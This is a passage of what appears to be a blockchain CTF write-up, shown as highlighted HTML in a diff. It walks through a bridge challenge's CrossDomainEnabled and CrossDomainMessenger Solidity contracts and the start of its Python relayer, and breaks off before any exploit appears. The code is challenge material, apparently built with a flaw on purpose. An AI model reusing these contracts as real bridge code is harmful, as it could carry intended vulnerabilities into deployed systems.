+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">&gt;</span><span class="mi">0</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span> <span class="o">&lt;</span><span class="mi">0</span><span class="p">.</span><span class="mi">9</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">ICrossDomainMessenger</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./ICrossDomainMessenger.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">CrossDomainEnabled</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Messenger contract used to send and recieve messages from the other domain.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">address</span> <span class="k">public</span> <span class="n">messenger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _messenger Address of the CrossDomainMessenger on the current layer.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_messenger</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">messenger</span> <span class="o">=</span> <span class="n">_messenger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * Enforces that the modified function is only callable by a specific cross-domain account.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _sourceDomainAccount The only account on the originating domain which is
+</span></span></span><span class="line"><span class="cl"><span class="cm">     *  authenticated to call this function.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">modifier</span> <span class="nf">onlyFromCrossDomainAccount</span><span class="p">(</span><span class="kt">address</span> <span class="n">_sourceDomainAccount</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="n">getCrossDomainMessenger</span><span class="p">()),</span> <span class="s">&#34;messenger contract unauthenticated&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">getCrossDomainMessenger</span><span class="p">().</span><span class="n">xDomainMessageSender</span><span class="p">()</span> <span class="o">==</span> <span class="n">_sourceDomainAccount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;wrong sender of cross-domain message&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * Gets the messenger, usually from storage. This function is exposed in case a child contract
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * needs to override.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @return The address of the cross-domain messenger contract which should be used.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getCrossDomainMessenger</span><span class="p">()</span> <span class="k">internal</span> <span class="k">virtual</span> <span class="k">returns</span> <span class="p">(</span><span class="n">ICrossDomainMessenger</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ICrossDomainMessenger</span><span class="p">(</span><span class="n">messenger</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * Sends a message to an account on another domain
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _crossDomainTarget The intended recipient on the destination domain
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _message The data to send to the target (usually calldata to a function with
+</span></span></span><span class="line"><span class="cl"><span class="cm">     *  `onlyFromCrossDomainAccount()`)
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">sendCrossDomainMessage</span><span class="p">(</span><span class="kt">address</span> <span class="n">_crossDomainTarget</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_message</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">getCrossDomainMessenger</span><span class="p">().</span><span class="n">sendMessage</span><span class="p">(</span><span class="n">_crossDomainTarget</span><span class="p">,</span> <span class="n">_message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Upon examining this function, we observe that <code>sendCrossDomainMessage</code> attempts to call the <code>sendMessage</code> function, which is implemented in the <code>CrossDomainMessenger</code>. Let&rsquo;s focus on the <code>CrossDomainMessenger</code>.</p>
+<p><strong>CrossDomainMessenger.sol</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">ICrossDomainMessenger</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./ICrossDomainMessenger.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">CrossDomainMessenger</span> <span class="k">is</span> <span class="n">ICrossDomainMessenger</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">relayer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">messageNonce</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">bytes32</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="k">public</span> <span class="n">relayedMessages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">bytes32</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="k">public</span> <span class="n">successfulMessages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">bytes32</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="k">public</span> <span class="n">sentMessages</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="n">xDomainMsgSender</span> <span class="o">=</span> <span class="mh">0x000000000000000000000000000000000000dEaD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">DEFAULT_XDOMAIN_SENDER</span> <span class="o">=</span> <span class="mh">0x000000000000000000000000000000000000dEaD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_relayer</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">relayer</span> <span class="o">=</span> <span class="n">_relayer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">modifier</span> <span class="nf">onlyRelayer</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">relayer</span><span class="p">,</span> <span class="s">&#34;not relayer&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">xDomainMessageSender</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">xDomainMsgSender</span> <span class="o">!=</span> <span class="n">DEFAULT_XDOMAIN_SENDER</span><span class="p">,</span> <span class="s">&#34;xDomainMessageSender is not set&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">xDomainMsgSender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * Sends a cross domain message to the target messenger.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _target Target contract address.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _message Message to send to the target.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">sendMessage</span><span class="p">(</span><span class="kt">address</span> <span class="n">_target</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_message</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">xDomainCalldata</span> <span class="o">=</span> <span class="n">encodeXDomainCalldata</span><span class="p">(</span><span class="n">_target</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_message</span><span class="p">,</span> <span class="n">messageNonce</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">sentMessages</span><span class="p">[</span><span class="nb">keccak256</span><span class="p">(</span><span class="n">xDomainCalldata</span><span class="p">)]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">SentMessage</span><span class="p">(</span><span class="n">_target</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_message</span><span class="p">,</span> <span class="n">messageNonce</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">messageNonce</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * Relays a cross domain message to a contract.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _target Target contract address.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _sender Message sender address.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _message Message to send to the target.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _messageNonce Nonce for the provided message.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">relayMessage</span><span class="p">(</span><span class="kt">address</span> <span class="n">_target</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_sender</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_message</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_messageNonce</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span>
+</span></span><span class="line"><span class="cl">        <span class="n">onlyRelayer</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// anti reentrance
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="n">xDomainMsgSender</span> <span class="o">==</span> <span class="n">DEFAULT_XDOMAIN_SENDER</span><span class="p">,</span> <span class="s">&#34;already in execution&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">xDomainCalldata</span> <span class="o">=</span> <span class="n">encodeXDomainCalldata</span><span class="p">(</span><span class="n">_target</span><span class="p">,</span> <span class="n">_sender</span><span class="p">,</span> <span class="n">_message</span><span class="p">,</span> <span class="n">_messageNonce</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="n">xDomainCalldataHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="n">xDomainCalldata</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">successfulMessages</span><span class="p">[</span><span class="n">xDomainCalldataHash</span><span class="p">]</span> <span class="o">==</span> <span class="kc">false</span><span class="p">,</span> <span class="s">&#34;Provided message has already been received.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">xDomainMsgSender</span> <span class="o">=</span> <span class="n">_sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">_target</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="n">_message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">xDomainMsgSender</span> <span class="o">=</span> <span class="n">DEFAULT_XDOMAIN_SENDER</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Mark the message as received if the call was successful. Ensures that a message can be
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// relayed multiple times in the case that the call reverted.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="n">success</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">successfulMessages</span><span class="p">[</span><span class="n">xDomainCalldataHash</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">emit</span> <span class="n">RelayedMessage</span><span class="p">(</span><span class="n">xDomainCalldataHash</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">emit</span> <span class="n">FailedRelayedMessage</span><span class="p">(</span><span class="n">xDomainCalldataHash</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * Generates the correct cross domain calldata for a message.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _target Target contract address.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _sender Message sender address.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _message Message to send to the target.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param _messageNonce Nonce for the provided message.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @return ABI encoded cross domain calldata.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">encodeXDomainCalldata</span><span class="p">(</span><span class="kt">address</span> <span class="n">_target</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_sender</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_message</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_messageNonce</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">internal</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pure</span>
+</span></span><span class="line"><span class="cl">        <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;relayMessage(address,address,bytes,uint256)&#34;</span><span class="p">,</span> <span class="n">_target</span><span class="p">,</span> <span class="n">_sender</span><span class="p">,</span> <span class="n">_message</span><span class="p">,</span> <span class="n">_messageNonce</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>sendMessage</code> function in the contract primarily serves to emit the <code>SentMessage(_target, msg.sender, _message, messageNonce);</code> event. Based on our analysis of both <code>CrossDomainEnabled</code> and <code>CrossDomainMessenger</code>, it seems that the protocol for a chain to communicate with another is through the emission of an event. To deepen our understanding, examining the off-chain relayer as defined in <code>relayer.py</code> is essential.</p>
+<p>Additionally, it&rsquo;s noteworthy that there is another function named <code>relayMessage</code>. This function is responsible for decoding the relayed message and executing the call that is encoded within that message.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">traceback</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">eth_abi</span> <span class="kn">import</span> <span class="n">abi</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">web3.contract.contract</span> <span class="kn">import</span> <span class="n">Contract</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">web3.middleware.signing</span> <span class="kn">import</span> <span class="n">construct_sign_and_send_raw_middleware</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctf_launchers.types</span> <span class="kn">import</span> <span class="p">(</span><span class="n">UserData</span><span class="p">,</span> <span class="n">get_additional_account</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                 <span class="n">get_unprivileged_web3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ORCHESTRATOR</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;ORCHESTRATOR_HOST&#34;</span><span class="p">,</span> <span class="s2">&#34;http://orchestrator:7283&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">INSTANCE_ID</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;INSTANCE_ID&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Relayer</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">__required_properties</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;mnemonic&#34;</span><span class="p">,</span> <span class="s2">&#34;challenge_address&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">instance_body</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">ORCHESTRATOR</span><span class="si">}</span><span class="s2">/instances/</span><span class="si">{</span><span class="n">INSTANCE_ID</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">instance_body</span><span class="p">[</span><span class="s2">&#34;ok&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="kc">False</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&#34;oops&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">user_data</span> <span class="o">=</span> <span class="n">instance_body</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">any</span><span class="p">(</span>
